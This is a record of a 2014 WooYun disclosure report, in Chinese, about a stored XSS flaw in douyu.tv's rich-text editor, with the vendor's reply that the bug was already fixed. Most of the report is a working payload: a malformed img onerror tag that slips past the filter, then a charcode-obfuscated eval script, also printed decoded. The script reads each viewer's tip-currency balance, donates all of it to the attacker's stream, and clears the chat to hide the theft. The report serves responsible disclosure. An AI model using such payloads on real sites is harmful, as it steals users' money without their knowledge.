{"id": 53760, "wybug_id": "wooyun-2014-066606", "wybug_title": "据说斗鱼TV鱼丸能换人民币？那就XSS吸光观众鱼丸！", "wybug_corp": "douyu.tv", "wybug_author": "N1ghtBird", "wybug_date": "2014-07-03 00:41", "wybug_open_date": "2014-07-03 22:08", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-03：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 刚看见斗鱼在做活动，观众送鱼丸主播领现金。那就猥琐的吸光观众的鱼丸吧~ 详细说明：  富文本编辑器的XSS过滤没有考虑到浏览器的容错特性。在某些现代浏览器内非规范标签是可行的。所以，构造以下代码（CHROME）。\n<img  src=\"x\" onerror =\"alert(1)\"\n\n\n\n\n成功执行。那么如何猥琐的刷鱼丸/刷人民币呢？开个直播间，设置个诱惑的标题配合封面图再加上我们的猥琐代码比如这样：\n<img id=\"xss\"  src=\"x\" onerror=\"eval(String.fromCharCode(36,40,39,35,120,115,115,39,41,46,114,101,109,111,118,101,40,41,59,115,101,116,84,105,109,101,111,117,116,40,102,117,110,99,116,105,111,110,40,41,123,118,97,114,32,110,117,109,61,36,40,39,35,121,119,116,105,116,39,41,46,116,101,120,116,40,41,59,118,97,114,32,100,97,116,97,61,91,123,110,97,109,101,58,39,116,121,112,101,39,44,118,97,108,117,101,58,39,100,111,110,97,116,101,114,101,113,39,125,44,123,110,97,109,101,58,39,109,115,39,44,118,97,108,117,101,58,110,117,109,125,93,59,118,97,114,32,100,97,116,97,95,115,116,114,61,83,116,116,101,110,99,111,100,101,40,100,97,116,97,41,59,116,104,105,115,77,111,118,105,101,40,39,87,101,98,82,111,111,109,39,41,46,106,115,95,103,105,118,101,80,114,101,115,101,110,116,40,100,97,116,97,95,115,116,114,41,59,99,116,114,108,99,108,101,97,114,40,39,99,104,97,116,95,108,105,110,101,95,108,105,115,116,39,41,59,99,111,110,115,111,108,101,46,108,111,103,40,39,87,111,111,121,117,110,39,41,59,125,44,49,48,48,48,41,59));\"//展开$('#xss').remove();setTimeout(function () {\tvar num = $('#ywtit').text();\tvar data = [{\t\t\tname : 'type',\t\t\tvalue : 'donatereq'\t\t}, {\t\t\tname : 'ms',\t\t\tvalue : num\t\t}\t];\tvar data_str = Sttencode(data);\tthisMovie('WebRoom').js_givePresent(data_str);\tctrlclear('chat_line_list');\tconsole.log('Wooyun');}, 1000);\n搞定~   漏洞证明：  \n\n   修复方案：  过...滤....   版权声明：转载请注明来源 N1ghtBird@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-07-03 00:47 厂商回复： 此bug已于前两天修复！谢谢！ 最新状态： 2014-07-03：此bug已于前两天修复！谢谢！  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}